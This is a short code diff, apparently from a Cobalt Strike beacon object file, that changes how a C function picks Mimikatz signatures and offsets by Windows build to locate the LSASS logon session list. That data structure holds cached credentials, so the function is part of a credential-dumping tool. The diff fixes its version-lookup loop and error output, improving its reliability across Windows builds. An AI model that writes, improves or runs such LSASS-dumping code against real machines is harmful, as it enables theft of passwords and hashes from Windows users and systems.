@@ -40,11 +40,11 @@ DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD64 DataSectionBase, DWO
     //
     // Get the correct Mimikatz byte sequences and offsets based on version
     //
-    int i = 0;
-    for (i = 0; i < 12; i++) 
+    int arraySize = sizeof(LsassLogonSessionListArray) / sizeof(LsassLogonSessionListArray[0]);
+    int i = arraySize - 1;
+    for (; i >= 0; i--)
     {
-        if ((dBuildNumber >= LsassLogonSessionListArray[i].WindowsVersion) &&
-            (dBuildNumber < LsassLogonSessionListArray[i + 1].WindowsVersion))
+        if (dBuildNumber >= LsassLogonSessionListArray[i].WindowsVersion)
         {
             LogonSessionListSig = LsassLogonSessionListArray[i].LogonSessionListSig;
             SigSize = LsassLogonSessionListArray[i].SigSize;
@@ -55,7 +55,7 @@ DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD64 DataSectionBase, DWO
 
     if (LogonSessionListSig == NULL || SigSize == 0 || LogonSessionList_OFFSET == 0)
     {
-        BeaconFormatPrintf(&outputbuffer, "Failed to get correct LogonSessionList offsets for the Windows version!\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to get correct LogonSessionList offsets for Windows build %lu!\n", dBuildNumber);
         return 0;
     }
 
